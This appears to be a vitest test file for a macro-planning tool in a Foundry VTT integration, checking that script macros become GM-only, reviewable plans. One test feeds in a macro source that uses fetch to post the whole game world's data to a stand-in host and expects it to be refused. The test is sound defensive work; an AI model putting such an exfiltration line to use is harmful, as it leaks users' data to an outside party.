import { describe, expect, it, vi, type Mock } from 'vitest';

import { makeTools } from '../test-support/make-tool-harness.js';

import { MacroForgeTools } from './macro-forge.js';

function setup(): { tools: MacroForgeTools; createPlan: Mock } {
  // Like the real service: a plan view carries the summary and the diff, never the ops. The notes
  // become diff lines of kind `note`.
  const createPlan = vi.fn((input: any) =>
    Promise.resolve({
      planId: 'plan-1',
      summary: input.summary,
      diff: (input.notes ?? []).map((text: string) => ({ kind: 'note', text })),
    })
  );
  const { tools } = makeTools(MacroForgeTools, { extra: { guardedWrites: { createPlan } } });
  return { tools, createPlan };
}

const args = {
  name: 'Roll Strength',
  description: 'Rolls a Strength check for the selected token and posts it.',
  source:
    "const r = await new Roll('1d20').evaluate(); await ChatMessage.create({ content: String(r.total) });",
};

describe('MacroForgeTools', () => {
  it('lists plan-macro', () => {
    const { tools } = setup();
    expect(tools.getToolDefinitions().map(t => t.name)).toEqual(['plan-macro']);
  });

  it('plans one GM-only, flagged script macro with the source and a summary', async () => {
    const { tools, createPlan } = setup();
    const plan: any = await tools.handleToolCall('plan-macro', args);
    expect(plan.autoApply).toBe(false);
    // The GM reads the source in the plan: it must be in the view, in full.
    expect(plan.diff.some((d: any) => d.kind === 'note' && d.text.includes(args.source))).toBe(
      true
    );
    const input = createPlan.mock.calls[0]?.[0];
    expect(input.feature).toBe('macro-forge');
    expect(input.summary).toContain('rolls dice or posts a chat message');
    expect(input.ops).toHaveLength(1);
    const op = input.ops[0];
    expect(op.documentName).toBe('Macro');
    expect(op.data).toMatchObject({
      name: 'Roll Strength',
      type: 'script',
      command: args.source,
      ownership: { default: 0 },
    });
    expect(op.data.flags['foundry-mcp-bridge'].macroForge).toBe(true);
  });

  it('refuses a source that sends data out, and plans nothing', async () => {
    const { tools, createPlan } = setup();
    await expect(
      tools.handleToolCall('plan-macro', {
        ...args,
        source: "await fetch('https://x.test', { body: JSON.stringify(game.world) })",
      })
    ).rejects.toThrow(/not allowed/);
    expect(createPlan).not.toHaveBeenCalled();
  });

  it('needs a plain-English description', async () => {
    const { tools } = setup();
    await expect(
      tools.handleToolCall('plan-macro', { ...args, description: 'x' })
    ).rejects.toThrow();
  });
});
